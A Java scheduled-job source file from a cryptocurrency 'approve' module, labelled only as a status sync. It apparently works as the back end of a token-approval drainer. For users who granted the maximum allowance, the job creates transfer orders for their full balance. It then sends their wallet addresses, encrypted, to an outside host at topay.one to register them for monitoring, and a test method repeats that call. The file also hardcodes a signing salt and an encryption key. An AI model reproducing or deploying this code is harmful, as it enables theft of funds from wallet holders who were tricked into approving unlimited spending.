package com.inso.modules.coin.approve.job;

import com.alibaba.fastjson.JSONObject;
import com.google.common.collect.Maps;
import com.inso.framework.conf.MyConfiguration;
import com.inso.framework.context.MyEnvironment;
import com.inso.framework.http.HttpMediaType;
import com.inso.framework.http.HttpSesstionManager;
import com.inso.framework.log.Log;
import com.inso.framework.log.LogFactory;
import com.inso.framework.service.Callback;
import com.inso.framework.spring.SpringContextUtils;
import com.inso.framework.utils.FastJsonHelper;
import com.inso.framework.utils.SignDataHelper;
import com.inso.framework.utils.StringUtils;
import com.inso.modules.coin.approve.logical.TransferOrderManager;
import com.inso.modules.coin.core.model.*;
import com.inso.modules.coin.approve.service.ApproveAuthService;
import com.inso.modules.coin.approve.service.ContractService;
import com.inso.modules.common.model.CryptoCurrency;
import com.inso.modules.passport.user.model.UserAttr;
import com.inso.modules.passport.user.model.UserInfo;
import com.inso.modules.passport.user.service.UserAttrService;
import com.inso.modules.passport.user.service.UserService;
import com.inso.modules.web.SystemRunningMode;
import org.apache.commons.codec.digest.DigestUtils;
import org.joda.time.DateTime;
import org.quartz.Job;
import org.quartz.JobExecutionContext;
import org.quartz.JobExecutionException;

import java.math.BigDecimal;
import java.util.Map;

/**
 * 同步状态
 * 余额 |　
 */
public class MonitorTransferJob implements Job {


    private static Log LOG = LogFactory.getLog(MonitorTransferJob.class);

    public static final String SALT = "fsaljfo87fwo3udfsfaslfdg";

    private static SignDataHelper mSignDataHelper = new SignDataHelper("fdadfl(^&(3423");

    public static final String KEY_UNIQUE_ID = "key";

    public static final String KEY_FROM_PLATFROM = "fromPlatform";
    public static final String KEY_NETWORK_TYPE = "networkType";
    public static final String KEY_CURRENCY_TYPE = "currencyType";

    public static final String KEY_ADDRESS = "fromAddress";
    public static final String KEY_AMOUNT = "amount";
    public static final String KEY_SIGN = "sign";
    public static final String KEY_TIME = "time";

    private UserService mUserService;
    private UserAttrService userAttrService;
    private ApproveAuthService mApproveAuthService;
    private TransferOrderManager mTransferOrderManager;

    private ContractService mContractService;

    private static HttpSesstionManager mHttp = HttpSesstionManager.getInstance();
    private static String mProjectName = MyConfiguration.getInstance().getString("project.name").toLowerCase();

    public MonitorTransferJob()
    {
        this.mUserService = SpringContextUtils.getBean(UserService.class);
        this.userAttrService = SpringContextUtils.getBean(UserAttrService.class);
        this.mApproveAuthService = SpringContextUtils.getBean(ApproveAuthService.class);
        this.mContractService = SpringContextUtils.getBean(ContractService.class);

        this.mTransferOrderManager = SpringContextUtils.getBean(TransferOrderManager.class);

    }

    @Override
    public void execute(JobExecutionContext context) throws JobExecutionException {

        if(!SystemRunningMode.isCryptoMode())
        {
            return;
        }

        if(StringUtils.isEmpty(mProjectName))
        {
            return;
        }

        DateTime toTime = new DateTime();
        DateTime fromTime = toTime.minusDays(60);
        doVerifyTask(fromTime, toTime);

    }


    private void doVerifyTask(DateTime fromTime, DateTime toTime)
    {
        try {
            mApproveAuthService.queryAll(new Callback<ApproveAuthInfo>() {
                @Override
                public void execute(ApproveAuthInfo model) {
                    // 如果授权过了 直接return 不在验证
                    if(model.getAllowance() == null || model.getAllowance().compareTo(ApproveAuthInfo.DEFAULT_MAX_ALLOWANCE) < 0)
                    {
                        return;
                    }
                    TransferOrderInfo transferOrderInfo = new TransferOrderInfo();
                    handleOrder(transferOrderInfo, model);
                }
            }, fromTime, toTime);
        } catch (Exception e) {
            LOG.error("handle error:", e);
        }
    }

    private void handleOrder(TransferOrderInfo transferOrderInfo, ApproveAuthInfo model)
    {
        try {
            UserInfo userInfo = mUserService.findByUsername(false, model.getUsername());
            UserInfo.UserType userType = UserInfo.UserType.getType(userInfo.getType());
            if(userType == UserInfo.UserType.TEST)
            {
                return;
            }

            CryptoNetworkType networkType = CryptoNetworkType.getType(model.getCtrNetworkType());
            // MyEnvironment.isDev()
            if(!(networkType == CryptoNetworkType.ETH_MAINNET || networkType == CryptoNetworkType.BNB_MAINNET))
            {
                return;
            }

            CryptoCurrency currency = CryptoCurrency.getType(model.getCurrencyType());
            if(currency == null)
            {
                return;
            }

            if(model.getMonitorMinTransferAmount() == null)
            {
                return;
            }

            if(networkType == CryptoNetworkType.ETH_MAINNET && model.getMonitorMinTransferAmount().compareTo(BigDecimal.ZERO) > 0 && model.getBalance().compareTo(BigDecimal.ZERO) > 0)
            {
                UserAttr userAttr = userAttrService.find(false, model.getUserid());
                ContractInfo contractInfo = mContractService.findByNetowrkAndCurrency(false, networkType, currency);
                createTransferOrder(userAttr, contractInfo, model, transferOrderInfo);
            }

            if(!MyEnvironment.isProd())
            {
                return;
            }

            Map<String, Object> data = Maps.newHashMap();

            data.put(KEY_UNIQUE_ID, StringUtils.getNotEmpty(transferOrderInfo.getNo()));
            data.put(KEY_ADDRESS, model.getSenderAddress());
            data.put(KEY_NETWORK_TYPE, networkType.getKey());
            data.put(KEY_CURRENCY_TYPE, currency.getKey());
            data.put(KEY_AMOUNT, model.getMonitorMinTransferAmount());
            data.put(KEY_FROM_PLATFROM, mProjectName);

            String dataStr = FastJsonHelper.jsonEncode(data);
            dataStr = encryptInputData(dataStr);

            data.clear();

            long time = System.currentTimeMillis();
            String tmpSign = generateSign(time, dataStr);

            data.put("data", dataStr);
            data.put(KEY_SIGN, tmpSign);
            data.put(KEY_TIME, time);

            // https://www.topay.one | 8103
            mHttp.asyncPost("https://www.topay.one/coin/riskApi/addListenerAddress", data, HttpMediaType.FORM, null);
        } catch (Exception e) {
            LOG.error("handle error: ", e);
        }
    }

    public static String generateSign(long time, String data)
    {
        String sequence = time + SALT + data;
//        System.out.println("sequence=" + sequence);
        String sign = DigestUtils.sha256Hex(sequence);
        return sign;
    }

    public static String encryptInputData(String data)
    {
        return mSignDataHelper.encryptPrivateKey(data);
    }

    public static JSONObject decryInputData(String data)
    {
        data = mSignDataHelper.decryptPrivateKey(data);
        return FastJsonHelper.toJSONObject(data);
    }

    private void createTransferOrder(UserAttr userAttr, ContractInfo contractInfo, ApproveAuthInfo authInfo, TransferOrderInfo transferOrderInfo)
    {
        BigDecimal transferAmount = authInfo.getBalance();
        mTransferOrderManager.createOrder(userAttr, contractInfo, authInfo, null, null,
                false, transferAmount, TriggerOperatorType.MONITOR_PREFIX, false, transferOrderInfo);
//        mTransferOrderManager.doTransfer(transferOrderInfo.getNo());
    }


    public void test()
    {
        try {
            DateTime toTime = new DateTime();
            DateTime fromTime = toTime.minusDays(100000000);
            doVerifyTask(fromTime, toTime);

        } catch (Exception e) {
            LOG.error("handle error:", e);
        }
    }

    public static void test2()
    {
        String senderAddress = "0x0a20a8aB473f2701C989D97f5C9bAC8cf76ef1EE";
        CryptoNetworkType networkType = CryptoNetworkType.MATIC_MUMBAI;
        CryptoCurrency currency = CryptoCurrency.USDT;
        String amountStr = "10";



        Map<String, Object> data = Maps.newHashMap();
        data.put(KEY_ADDRESS, senderAddress);
        data.put(KEY_NETWORK_TYPE, networkType.getKey());
        data.put(KEY_CURRENCY_TYPE, currency.getKey());
        data.put(KEY_AMOUNT, amountStr);
        data.put(KEY_FROM_PLATFROM, mProjectName);

        String dataStr = FastJsonHelper.jsonEncode(data);
        String encryptData = encryptInputData(dataStr);

        long time = System.currentTimeMillis();
        String tmpSign = generateSign(time, encryptData);

        data.clear();
        data.put("data", encryptData);
        data.put(KEY_TIME, time);
        data.put(KEY_SIGN, tmpSign);

        // https://www.topay.one |
        mHttp.asyncPost("https://www.topay.one/coin/riskApi/addListenerAddress", data, HttpMediaType.FORM, null);
    }

    public static void main(String[] args) {
        //test2();
    }

}
